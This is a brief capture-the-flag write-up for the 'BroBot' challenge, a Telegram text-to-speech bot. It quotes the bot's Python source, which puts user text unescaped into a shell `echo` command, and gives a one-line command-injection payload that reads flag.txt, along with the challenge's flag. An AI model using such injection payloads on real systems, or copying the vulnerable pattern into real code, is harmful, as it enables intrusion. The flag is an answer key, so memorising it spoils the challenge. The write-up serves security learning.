# BroBot

We have to extract the flag fom a Telegram Bot in this challenge.  
Start with some info about the bot.

```txt
/about
```

```txt
CTF - https://ctf.csivit.com/
Our Team - https://ctftime.org/team/77170/
Homepage - https://csivit.com/
Contribute - https://github.com/alias-rahil/speakingbot.git/
CTF Support - https://discord.com/invite/9wHPB2B/
BoT Support - @alias_rahil
```

We have only command `/text2voice`.
We have link to the source of the bot. We can see that it writes our text as arg for `echo` in a shell script.
Then pipes the script's output to `espeak` to get the sound.  

We can inject shell commands on our text, and we use it to get flag.

```py
fs = open(f"/home/ctf/{update.message.from_user.id}", "w")
    fs.write(f"echo '{text}'")
    fs.close()
    os.system(
        f"su ctf -c 'sh /home/ctf/{update.message.from_user.id} | espeak -w /home/ctf/{update.message.from_user.id}.wav --stdin'"
)
```

```txt
';cat flag.txt;'
```

The flag is

```txt
csictf{ai_will_take_over_the_world}
```
